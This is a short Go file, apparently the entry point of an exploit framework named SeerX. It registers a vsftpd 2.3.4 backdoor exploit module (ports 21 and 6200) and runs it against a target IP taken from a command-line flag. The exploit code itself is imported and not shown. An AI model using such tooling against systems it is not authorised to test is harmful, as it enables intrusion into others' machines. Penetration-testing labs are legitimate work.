package main

import (
	"flag"
	"fmt"

	"github.com/Flaskbush/SeerX/exploits"
	"github.com/Flaskbush/SeerX/exploits/vsftpd"
)

func main() {
	target := flag.String("target", "192.168.88.112", "Target IP")
	exploitName := flag.String("exploit", "vsftpd-2.3.4", "Exploit name")
	flag.Parse()

	manager := exploits.NewExploitManager()

	// Registers our exploits
	manager.Register(vsftpd.NewExploitManager("21", "6200"))

	// Run the exploit against the target
	err := manager.RunExploit(*exploitName, *target)
	if err != nil {
		fmt.Printf("Error: %v\n", err)
	}
}
